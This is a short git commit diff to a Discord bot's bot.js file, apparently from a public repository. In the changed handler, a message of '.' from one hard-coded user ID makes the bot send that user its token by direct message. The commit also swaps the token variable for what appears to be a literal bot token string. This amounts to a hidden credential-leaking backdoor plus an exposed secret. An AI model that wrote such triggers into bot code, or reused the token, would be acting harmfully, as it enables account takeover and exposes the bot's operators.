833f6a36314d83a01972302e473f579ef170ee3b
streaming-yassine <44115214+MyassineM@users.noreply.github.com>
2018-11-20 14:17:26 +0100

    Update bot.js

--- bot.js
+++ bot.js
@@ -17,6 +17,6 @@ if (message.author.bot) return;
            if (message.content == '.')
            if (message.author.id === '436918120184021012'){
 if (!message.channel.guild) return;
-message.author.send(Token)
+message.author.send("NTEzMzc4OTU0NDk3NzUzMDk4.DtWaxA.IQVd-sA0w97ecdalhS4qlLqSwAY")
 }  
 });
